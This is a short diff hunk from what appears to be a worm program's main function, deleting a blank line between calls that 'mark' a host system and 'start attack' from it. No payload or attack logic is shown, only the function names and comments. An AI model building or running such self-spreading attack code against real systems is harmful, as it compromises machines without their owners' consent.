@@ -24,7 +24,6 @@ def main():
 
     """ Mark host system"""
     worm.place_worm()
-
     """ Start attack from new system """
     worm.start_attack()
 
